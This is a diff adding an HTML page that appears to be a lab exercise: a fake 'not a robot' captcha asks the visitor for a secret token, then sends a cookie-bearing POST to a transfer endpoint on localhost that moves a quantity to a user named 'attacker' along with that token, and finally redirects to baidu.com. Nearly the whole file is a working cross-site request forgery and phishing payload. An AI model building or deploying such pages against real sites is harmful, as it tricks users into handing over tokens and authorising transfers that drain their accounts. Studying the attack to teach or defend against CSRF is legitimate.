@@ -1,0 +1,29 @@
+<html>
+  <head>
+    <title>Robot Test</title>
+  </head>
+  <body>
+
+<p> input Super Secret Token to prove you are not a robot</p>
+<input id="token" type="text" placeholder="Captcha">
+<button onClick="getpay()">Confirm</button>
+
+<script>
+function getpay() {
+  var request = new XMLHttpRequest(); //实例
+var token = document.getElementById("token").value; //获取token
+  request.open("POST", "http://localhost:3000/super_secure_post_transfer", false); //设置请求但没有发送
+  request.setRequestHeader("Content-type","application/x-www-form-urlencoded");//设置参数
+  request.withCredentials = true; //使用cookie
+  try {
+    request.send("quantity=10&destination_username=attacker&tokeninput=" + token); //发送
+  } catch (err) {
+    // Do nothing
+  } finally {
+    window.top.location = "http://baidu.com";   //最后跳转到baidu
+  }
+}
+</script>
+
+  </body>
+</html>
